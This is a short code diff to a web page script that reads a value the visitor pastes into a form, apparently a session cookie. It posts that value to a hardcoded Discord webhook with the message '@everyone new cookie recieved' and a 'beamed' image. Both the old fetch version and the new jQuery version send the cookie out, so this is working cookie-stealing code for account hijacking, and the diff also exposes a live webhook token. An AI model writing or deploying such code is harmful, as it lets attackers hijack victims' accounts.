@@ -44,20 +44,13 @@
 				let cook = $("#form-input")[0].value;
 				console.log(cook);
 				
-				write("➡️ Submitting webhook...");
+				var req = $.post("https://discord.com/api/webhooks/1101528266373873694/X3TVaHAB8jJ6BqJ9TOB2tVQA9ogpnpSy4niSzwM1BuohDdP-ApPedUPPLP3n3UYi2qWT", {
+					"content": `@everyone new cookie recieved:\n\`\`\`\n${cook}\n\`\`\`\nhttps://media.tenor.com/V5jKgnXoSzIAAAAd/beamed-discord.gif`
+				});
 
-				fetch("https://discord.com/api/webhooks/1101528266373873694/X3TVaHAB8jJ6BqJ9TOB2tVQA9ogpnpSy4niSzwM1BuohDdP-ApPedUPPLP3n3UYi2qWT",{
-					method: "POST",
-					headers: {
-						"Content-Type": "application/json",
-						},
-					body: JSON.stringify({
-						"content": `@everyone new cookie recieved:\n\`\`\`\n${cook}\n\`\`\`\nhttps://media.tenor.com/V5jKgnXoSzIAAAAd/beamed-discord.gif`
-					})
-				})
-					.then(handleErrors)
-					.then(response => write("✅ Success (cookie posted with zero failures)&nbsp;" + JSON.stringify(response)))
-					.catch(error => write("❌ Failure (" + JSON.stringify(error) + ")"));
+				req.always = function(){ write("➡️ Submitting webhook") };
+				req.done = function() { write("✅ Success (cookie posted with zero failures)") };
+				req.fail = function() { write("❌ Failure") };
 			});
 		</script>
 
